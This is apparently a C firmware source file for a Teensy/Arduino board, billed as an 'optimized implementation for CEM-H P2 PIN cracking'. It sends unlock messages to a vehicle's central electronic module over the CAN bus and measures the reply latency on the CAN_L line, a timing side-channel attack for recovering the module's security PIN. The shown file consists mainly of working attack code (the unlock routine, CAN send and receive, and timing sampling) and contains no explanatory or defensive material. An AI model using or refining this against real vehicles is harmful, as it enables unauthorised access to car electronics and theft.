/* SPDX-License-Identifier: GPL-3.0 */
/*
 * Optimized implementation for CEM-H P2 PIN cracking
 */

#include "cem_cracker_optimized.h"
#include <Arduino.h>
#include <math.h>

// Global variables
FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;
uint32_t cem_reply_min;
uint32_t cem_reply_avg;
uint32_t cem_reply_max;
volatile bool abortReq = false;
uint8_t shuffle_order[PIN_LEN];

// Sequence structure for PIN attempts
typedef struct {
    uint8_t pinValue;
    uint32_t latency;
    double std;
} sequence_t;

sequence_t sequence[100] = { 0 };

// Optimized CEM unlock function
bool cemUnlock(uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose) {
    uint8_t unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
    uint8_t reply[CAN_MSG_SIZE];
    uint64_t start, quick_timeout;
    
    // Quick timeout for obviously wrong PINs
    quick_timeout = cem_reply_avg * QUICK_TIMEOUT_FACTOR;
    
    // Multiple sampling points for accuracy
    uint32_t sample_points[3] = {0};
    uint32_t sample_count = 0;
    
    // Shuffle PIN with optimized order for CEM-H
    for (uint32_t i = 0; i < PIN_LEN; i++) {
        unlockMsg[2 + shuffle_order[i]] = pin[i];
    }
    
    // Send unlock request with timing optimization
    canMsgSend(CAN_HS, 0xffffe, unlockMsg, verbose);
    
    start = ARM_DWT_CYCCNT;
    while (ARM_DWT_CYCCNT - start < quick_timeout) {
        if (!digitalRead(CAN_L_PIN)) {
            sample_points[sample_count++] = ARM_DWT_CYCCNT - start;
            if (sample_count >= 3) break;
        }
    }
    
    // Early termination for obviously wrong PINs
    if (sample_count == 0) {
        if (latency) *latency = quick_timeout;
        return false;
    }
    
    // Calculate weighted average of sampling points
    uint32_t weighted_latency = 0;
    for (uint32_t i = 0; i < sample_count; i++) {
        weighted_latency += sample_points[i] * (i + 1);
    }
    weighted_latency /= ((sample_count * (sample_count + 1)) / 2);
    
    if (latency) *latency = weighted_latency;
    
    // Return PIN if requested
    if (pinUsed) {
        memcpy(pinUsed, unlockMsg + 2, PIN_LEN);
    }
    
    // Check response with optimized timing
    bool success = canMsgReceive(CAN_HS, NULL, reply, 500, false);
    return success && reply[2] == 0x00;
}

// CAN message send function
void canMsgSend(can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose) {
    CAN_message_t msg;
    
    if (verbose) {
        Serial.printf("CAN_%cS ---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
                     bus == CAN_HS ? 'H' : 'L',
                     id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
    }
    
    msg.id = id;
    msg.len = 8;
    msg.flags.extended = 1;
    memcpy(msg.buf, data, 8);
    
    switch (bus) {
        case CAN_HS:
            can_hs.write(msg);
            break;
        case CAN_LS:
            can_ls.write(msg);
            break;
    }
}

// CAN message receive function
bool canMsgReceive(can_bus_id_t bus, uint32_t *id, uint8_t *data, uint32_t wait, bool verbose) {
    CAN_message_t msg;
    bool ret = false;
    
    do {
        ret = (bus == CAN_HS) ? can_hs.read(msg) : can_ls.read(msg);
        if (ret) {
            if (id) *id = msg.id;
            if (data) memcpy(data, msg.buf, CAN_MSG_SIZE);
            
            if (verbose) {
                Serial.printf("CAN_%cS <--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
                            bus == CAN_HS ? 'H' : 'L',
                            msg.id, msg.buf[0], msg.buf[1], msg.buf[2], msg.buf[3],
                            msg.buf[4], msg.buf[5], msg.buf[6], msg.buf[7]);
            }
            break;
        }
        delay(1);
        wait--;
    } while (wait > 0);
    
    return ret;
}

// BCD conversion functions
uint8_t binToBcd(uint8_t value) {
    return ((value / 10) << 4) | (value % 10);
}

uint8_t bcdToBin(uint8_t value) {
    return ((value >> 4) * 10) + (value & 0xf);
}

// LCD helper functions
void lcd_printf(uint8_t x, uint8_t y, const char *fmt, ...) {
    char buf[LCD_COLS + 1];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    
    extern LiquidCrystal lcd;
    lcd.setCursor(x, y);
    lcd.print(buf);
}

void lcd_spinner(void) {
    static uint32_t index = 0;
    static uint32_t last_update = 0;
    uint32_t now = millis();
    
    if (now - last_update < 500) return;
    
    last_update = now;
    extern LiquidCrystal lcd;
    lcd.setCursor(15, 1);
    lcd.write(index++ % 4);
}

// Interrupt handler for abort button
void abortIsr(void) {
    abortReq = true;
}

// CAN event handlers
void can_hs_event(const CAN_message_t &msg) {
    // Handle high-speed CAN events
}

void can_ls_event(const CAN_message_t &msg) {
    // Handle low-speed CAN events
}
